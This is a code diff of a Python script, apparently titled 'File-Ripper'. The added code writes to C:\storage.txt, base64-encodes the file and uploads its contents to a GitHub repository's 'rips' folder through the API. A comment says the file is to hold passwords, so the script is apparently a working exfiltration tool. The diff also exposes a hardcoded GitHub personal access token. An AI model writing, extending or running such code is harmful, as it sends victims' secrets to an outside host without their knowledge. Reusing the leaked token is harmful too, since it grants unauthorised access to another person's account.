@@ -13,20 +13,60 @@ ghToken = 'github_pat_11AQORUDQ0CAWDzZ6fVrNW_vqshysbbNm1jNzVH7wbBNIYvpUOR8AWh07f
 ghRepo ='File-Ripper'
 ipFile = 'C:\storage.txt'
 ghBranch = 'master'
-ghTarger = 'rips/storage.txt'
-ghUrl = 'https://api.github.com/repos/willemsedirk/file-ripper/contents/rips/'
+ghTarget = 'rips/storage.txt'
+ghUrl = 'https://api.github.com/repos/willemsedirk/file-ripper/contents/rips'
+ipPath ='C:\storage.txt'
 
-
+def fcheck(path):
+    return os.path.isfile(path)
+    
 def fileCreate():
     f = open('C:\storage.txt','x') # creates file
     with open("C:\storage.txt", "a") as f: # opens the file and appends to it 
      f.write("Now the file has more content!") # write to the file add pws
 
-fileCreate()
+def enc():
+    with open(ipFile, 'rb') as file: # opens
+     content = file.read() # reads file
+     encoded_content = base64.b64encode(content).decode('utf-8') # encodes in base64
+     with open(ipFile,'w') as f: # overides existing text
+      f.write(encoded_content)
+      return encoded_content
 
-with open(ipFile, 'rb') as file:
-    content = file.read()
-    encoded_content = base64.b64encode(content).decode('utf-8')
+
+if fcheck(ipPath):
+    print(f"{ipPath} is present")
+    with open("C:\storage.txt", "a") as f: # opens the file and appends to it 
+     f.write("Now the file has more content!")
+else: 
+    fileCreate()
+
+enc()
+enc_content = enc()
+print(enc_content)
+
+# --- HTTP Headers ---
+headers = {
+    "Authorization": f"token {ghToken}",
+    "Accept": "application/vnd.github.v3+json"
+}
+
+# --- HTTP PUT payload ---
+data = {
+    "message": f"Add {ghTarget}",
+    "branch": ghBranch,
+    "content": enc_content
+}
+
+# --- Send PUT request ---
+response = requests.put(ghUrl, headers=headers, json=data)
+
+if response.status_code == 201:
+    print(f"File uploaded successfully to {ghTarget}!")
+else:
+    print(f"Failed to upload file. Status code: {response.status_code}")
+    print(response.json())
+
 
 
 def roll():
